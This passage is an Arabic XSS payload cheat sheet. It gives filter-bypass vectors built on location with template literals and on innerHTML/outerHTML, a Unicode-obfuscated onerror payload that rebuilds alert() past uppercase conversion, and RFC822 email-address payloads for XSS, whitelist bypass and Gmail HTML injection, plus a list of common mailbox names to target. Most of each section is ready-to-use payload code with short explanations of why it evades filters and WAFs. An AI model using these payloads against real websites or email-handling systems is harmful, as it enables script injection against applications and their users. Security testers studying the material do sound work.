ناقلات الموقع مع URL ذاتي باستخدام الأكواد أعلاه فعالة لأنها تستغل انعكاس المعلمات لتكوين XSS.

---

## 3. الموقع مع القالب الحرفي (Location with Template Literal)
{ #XSS--ALL--Event--Payload  / #ideas_for_url}
**الشرح البسيط:**
تُستخدم قوالب JavaScript الحرفية (Template Literals) مثل `${alert(1)}` مع خصائص الوثيقة لتكوين `javascript:alert(1)` عبر `location`.

**الأكواد:**
```
${alert(1)}<javascript:`//onmouseover=location=tagName+URL>hoverme!
${alert(1)}<j/onmouseover=location=innerHTML+URL>javascript:`//hoverme!
${alert(1)}<javas/onmouseover=location=tagName+innerHTML+URL>cript:`//hoverme!
${alert(1)}`<javascript:`//onmouseover=location=tagName+previousSibling.nodeValue>hoverme!
${alert(1)}`<javas/onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
```

**لماذا يعمل؟**
- `${alert(1)}` يُضاف كجزء من القالب الحرفي.
- `tagName` و`innerHTML` يُكملان `javascript:alert(1)`.
- يتطلب تفاعل (`onmouseover`) ويتجاوز مرشحات القوالب.

**الخلاصة:**
ناقلات الموقع مع القالب الحرفي باستخدام الأكواد أعلاه فعالة لأنها تستخدم قوالب JavaScript لتضليل المرشحات.

---

## 4. بديل خصائص Inner & Outer HTML (Inner & Outer HTML Properties Alternative)
{ #XSS--ALL--Event--Payload  / #ideas_for_url}
**الشرح البسيط:**
تُستخدم خصائص `innerHTML` و`outerHTML` لإدراج HTML يحتوي على XSS بدلاً من إعادة التوجيه عبر `location`. تُستخدم مجموعات العناصر مثل `all[0]` أو `images[0]`.

**الأكواد:**
```
<svg id=<img/src/onerror=alert(1)> onload=head.innerHTML=id>
<svg id=<img/src/onerror=alert(1)> onload=body.outerHTML=id>
```

**لماذا يعمل؟**
- `innerHTML` و`outerHTML` يُدرجان HTML يحتوي على `<img>` مع `onerror=alert(1)`.
- يمكن استخدام `all[0]`، `forms[0]`، إلخ بدلاً من `head` أو `body`.
- يتجاوز مرشحات `location` باستخدام DOM مباشرة.

**الخلاصة:**
بديل `innerHTML` و`outerHTML` باستخدام الأكواد أعلاه فعال لأنه يُدرج XSS عبر DOM بدلاً من `location`.

---
سأقدم شرحًا بالعربية بطريقة مبسطة جدًا للمعلومات المقدمة حول ناقلات XSS المرتبطة بحقول البريد الإلكتروني والهجوم عند تحويل `alert()` إلى `ALERT()`، مع فصل الأكواد عن الشرح بوضوح. سأركز على الحمولات الفعالة التي تتجاوز المرشحات وجدران الحماية (WAF) حتى يونيو 2025، مع أمثلة وخلاصة لكل قسم. كما سأتناول الناقلات غير الشائعة لحقول البريد الإلكتروني بناءً على مواصفات RFC822.

---

## تجاوز تحويل `alert()` إلى `ALERT()`
{ #XSS_with_out_alret }
**الشرح البسيط:**
إذا كان التطبيق يُحول `alert()` إلى `ALERT()` (مثل عبر تحويل الأحرف الصغيرة إلى كبيرة)، يمكن استخدام حمولة مشفرة بأحرف يونيكود غير قياسية لتكوين `alert()` بشكل ديناميكي وتنفيذها.

**الكود:**
```
onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')()"
```

**لماذا يعمل؟**
- يستخدم أحرف يونيكود (مثل `𐂃`) كمتغيرات لتجنب الكشف.
- يُشكل `alert()` ديناميكيًا عبر سلسلة معقدة من العمليات (مثل `!''+''` لتكوين `false`).
- يتجاوز مرشحات تحويل الأحرف لأنه لا يحتوي على `alert` بشكل مباشر.
- يُنفذ عبر `onerror`، مما يتطلب حدث خطأ (مثل صورة غير موجودة).

**الخلاصة:**
الحمولة المشفرة بأحرف يونيكود فعالة لأنها تُشكل `alert()` ديناميكيًا وتتجاوز تحويل الأحرف إلى `ALERT()`.

---

## ناقلات هجوم غير شائعة لحقول البريد الإلكتروني (RFC822)
{ #XSS_other_idea  }
**الشرح البسيط:**
تستغل مواصفات RFC822 التي تسمح بإدراج تعليقات أو أجزاء معقدة في عناوين البريد الإلكتروني لتنفيذ XSS، SQLi، أو حتى RCE إذا لم تُنظف المدخلات بشكل صحيح.

#### **أنواع الناقلات:**
1. **XSS في حقول البريد الإلكتروني:**
   - تُستخدم تعليقات RFC822 أو أجزاء غير قياسية في البريد لإدراج حمولات XSS.
   - يمكن أن تُعكس في HTML أو JavaScript غير مُنظف.

2. **تجاوز القوائم البيضاء (Whitelists):**
   - إدراج نطاقات مسموحة مع حمولات في أجزاء التعليق.

3. **حقن HTML (مثل Gmail):**
   - إدراج علامات HTML في تعليقات البريد لتغيير تنسيق العرض.

4. **تجاوز المدققات الصارمة:**
   - استخدام تنسيقات بريد معقدة لتجاوز التحقق.

5. **استغلال SSO والتكاملات:**
   - إنشاء حسابات في منصات مثل GitHub أو Salesforce تحتوي على XSS في البريد لاستغلال تسجيل الدخول.

6. **حسابات بريد شائعة:**
   - استهداف عناوين بريد شائعة (مثل `support@`) التي قد تُعالج المدخلات بشكل سيء.

#### **الأكواد:**

- **XSS عبر تعليقات البريد:**
  ```
  test+(alert(0))@example.com
  test@example(alert(0)).com
  "alert(0)"@example.com
  <script src=//xsshere?>@email.com
  inti(;inti@inti.io;)@whitelisted.com
  inti@inti.io(@whitelisted.com)
  inti+(@whitelisted.com;)@inti.io
  ```

- **حقن HTML في Gmail:**
  ```
  inti.de.ceukelaire+(<b>bold<u>underline<s>strike<br/>newline<strong>strong<sup>sup<sub>sub)@gmail.com
  ```

**لماذا يعمل؟**
- مواصفات RFC822 تسمح بتعليقات (مثل `(...)`) وأجزاء معقدة في عناوين البريد.
- التطبيقات التي لا تُنظف التعليقات قد تُعكس الحمولة في HTML أو JavaScript.
- نطاقات القوائم البيضاء يمكن تضمينها مع حمولات في التعليقات.
- منصات مثل Gmail تُفسر علامات HTML في تعليقات البريد.
- SSO ينقل عناوين البريد دون تنظيف، مما يسمح بـ XSS عبر التكاملات.

**أمثلة على حسابات بريد شائعة:**
```
support@
jira@
print@
feedback@
asana@
slack@
hello@
bug(s)@
upload@
service@
it@
test@
help@
tickets@
tweet@
```

**لماذا تُستهدف هذه الحسابات؟**
- غالبًا تُستخدم لتلقي مدخلات المستخدم (مثل التذاكر أو الملاحظات).
- قد تُعالج المدخلات بشكل سيء، مما يسمح بـ XSS أو هجمات أخرى.

**الخلاصة:**
ناقلات البريد الإلكتروني باستخدام الأكواد أعلاه فعالة لأنها تستغل تعليقات RFC822 وتنسيقات معقدة لإدراج XSS، HTML، أو استغلال SSO، خاصة مع حسابات بريد شائعة.

---
